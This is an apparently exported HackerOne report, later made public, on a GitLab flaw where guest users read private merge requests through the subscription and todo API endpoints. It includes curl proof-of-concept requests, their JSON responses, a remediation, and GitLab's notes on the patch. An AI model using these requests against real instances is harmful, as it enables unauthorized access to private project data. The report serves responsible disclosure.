{"id":195134,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTUxMzQ=","url":"https://hackerone.com/reports/195134","title":"User with guest access can access private merge requests","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-01-01T20:13:06.240Z","submitted_at":"2017-01-01T20:13:06.240Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jobert","url":"/jobert","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-01-23T23:09:46.885Z","bug_reporter_agreed_on_going_public_at":"2017-01-23T20:47:18.377Z","team_member_agreed_on_going_public_at":"2017-01-23T23:09:46.844Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Vulnerability details\nA guest user to a private group, cannot access a project's merge requests. However, through the subscription API, an attacker can (un)subscribe itself to a merge request, revealing private information that shouldn't be accessible.\n\n# Impact\nMerge request might contain private information that the repository owner does not want to reveal to guest access users. \n\n# Proof of concept\n1. As a group / project owner, invite someone with guest access\n2. As the same user, create a merge request - this MR is not accessible by users with guest access\n3. Accept the invitation as a new user and create an API token for your account\n4. Now send a `POST` request to the subscription API with a reference to the MR:\n\n**Request**\n```\ncurl -X POST -H \"Private-Token: XXXX\" http://gitlab-instance/api/v3/projects/1/merge_requests/1/subscription\n```\n\n**Response**\n```json\n{\n  \"id\": 2,\n  \"iid\": 2,\n  \"project_id\": 1,\n  \"title\": \"\u003ctitle\u003e\",\n  \"description\": \"\u003cdescription\u003e\",\n  \"state\": \"opened\",\n  \"created_at\": \"2017-01-01T19:55:03.121Z\",\n  \"updated_at\": \"2017-01-01T19:55:03.121Z\",\n  \"target_branch\": \"master\",\n  \"source_branch\": \"dev\",\n  \"upvotes\": 0,\n  \"downvotes\": 0,\n  \"author\": {\n    \"name\": \"XXX\",\n    \"username\": \"XXX\",\n    \"id\": 1,\n    \"state\": \"active\",\n    \"avatar_url\": \"...\",\n    \"web_url\": \"...\"\n  },\n  \"assignee\": null,\n  \"source_project_id\": 2,\n  \"target_project_id\": 2,\n  \"labels\": [\n    \n  ],\n  \"work_in_progress\": false,\n  \"milestone\": null,\n  \"merge_when_build_succeeds\": false,\n  \"merge_status\": \"can_be_merged\",\n  \"sha\": \"c60a6c2312c184942b19c1828abb3d65e66c01c7\",\n  \"merge_commit_sha\": null,\n  \"subscribed\": true,\n  \"user_notes_count\": 0,\n  \"approvals_before_merge\": null,\n  \"should_remove_source_branch\": null,\n  \"force_remove_source_branch\": false,\n  \"web_url\": \"...\"\n}\n```\n\nYou'll notice that when requesting the MR directly, the server will return a 403.\n\n**Request**\n```\ncurl -X GET -H \"Private-Token: XXXX\" http://gitlab-instance/api/v3/projects/1/merge_requests/2\n```\n\n**Response**\n```json\n{\"message\":\"403 Forbidden\"}\n```\n\n# Remediation\nUse the appropriate finder in the `lib/api/subscriptions.rb` on line 6 and 7 instead of calling `find` directly on the `merge_requests` relationship. This will scope the available merge requests to the ones that the user can subscribe to.","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-02-22T20:47:18.418Z","allow_singular_disclosure_after":-146164306.38609105,"singular_disclosure_allowed":true,"vote_count":13,"voters":["ysx","ayoubfathi_","mpz","eveeez","japz","secdoor","spetr0x","cryptosector","turbo0001","arice","and 3 more..."],"severity":{"rating":"medium","score":4.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1393887,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There's another endpoint that reveals this information: when sending a `POST` request to `/api/v3/projects/:id/merge_requests/:id/todo`, the MR object will be returned. Just reporting this in a single report because the same code pattern as reported earlier in this report is applicable here. Here's a request and response to proof the vulnerability. Repeat step 1, 2, and 3 in the report description.\n\n**Request**\n```\ncurl -X POST -H \"Private-Token: XXXX\" http://gitlab-instance/api/v3/projects/1/merge_requests/2/todo\n```\n\n**Response**\n```json\n{\n  \"id\": 1,\n  \"project\": {\n    \"id\": 1,\n    \"http_url_to_repo\": \"...\",\n    \"web_url\": \"...\",\n    \"name\": \"test\",\n    \"name_with_namespace\": \"test / test\",\n    \"path\": \"test\",\n    \"path_with_namespace\": \"test/test\"\n  },\n  \"author\": {\n    \"name\": \"Jobert Abma\",\n    \"username\": \"jobertabma\",\n    \"id\": 1,\n    \"state\": \"active\",\n    \"avatar_url\": \"...\",\n    \"web_url\": \"...\"\n  },\n  \"action_name\": \"marked\",\n  \"target_type\": \"MergeRequest\",\n  \"target\": {\n    \"id\": 2,\n    \"iid\": 2,\n    \"project_id\": 1,\n    \"title\": \"\u003ctitle\u003e\",\n    \"description\": \"\u003cdescription\u003e\",\n    \"state\": \"opened\",\n    \"created_at\": \"2017-01-01T19:55:03.121Z\",\n    \"updated_at\": \"2017-01-01T20:16:22.331Z\",\n    \"target_branch\": \"master\",\n    \"source_branch\": \"dev\",\n    \"upvotes\": 0,\n    \"downvotes\": 0,\n    \"author\": {\n      \"name\": \"JA\",\n      \"username\": \"root\",\n      \"id\": 1,\n      \"state\": \"active\",\n      \"avatar_url\": \"...\",\n      \"web_url\": \"...\"\n    },\n    \"assignee\": null,\n    \"source_project_id\": 1,\n    \"target_project_id\": 1,\n    \"labels\": [\n      \n    ],\n    \"work_in_progress\": false,\n    \"milestone\": null,\n    \"merge_when_build_succeeds\": false,\n    \"merge_status\": \"can_be_merged\",\n    \"sha\": \"c60a6c2312c184942b19c1828abb3d65e66c01c7\",\n    \"merge_commit_sha\": null,\n    \"subscribed\": false,\n    \"user_notes_count\": 1,\n    \"approvals_before_merge\": null,\n    \"should_remove_source_branch\": null,\n    \"force_remove_source_branch\": false,\n    \"web_url\": \"...\"\n  },\n  \"target_url\": \"...\",\n  \"body\": \"\u003ctitle\u003e\",\n  \"state\": \"pending\",\n  \"created_at\": \"2017-01-01T20:16:22.324Z\"\n}\n```","automated_response":false,"created_at":"2017-01-01T20:21:51.677Z","updated_at":"2017-01-01T20:21:51.677Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1393989,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks Jobert!\n\nI've opened confidential issue https://gitlab.com/gitlab-org/gitlab-ce/issues/26249 and will keep you updated on our progress.","automated_response":false,"created_at":"2017-01-02T00:47:04.928Z","updated_at":"2017-01-02T00:47:04.928Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1437147,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"A patch for this vulnerability is scheduled to go out in a security release tomorrow. I'll update the issue here when it does. Thanks for the report!","automated_response":false,"created_at":"2017-01-22T18:11:09.095Z","updated_at":"2017-01-22T18:11:09.095Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1439311,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We've released a patch for this vulnerability today: https://about.gitlab.com/2017/01/23/gitlab-8-dot-16-dot-1-security-release/\n\nThanks again!","automated_response":false,"created_at":"2017-01-23T20:45:18.231Z","updated_at":"2017-01-23T20:45:18.231Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jobert","url":"/jobert"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1439320,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-01-23T20:47:18.397Z","updated_at":"2017-01-23T20:47:18.397Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1439695,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-01-23T23:09:46.862Z","updated_at":"2017-01-23T23:09:46.862Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1439696,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-01-23T23:09:46.902Z","updated_at":"2017-01-23T23:09:46.902Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}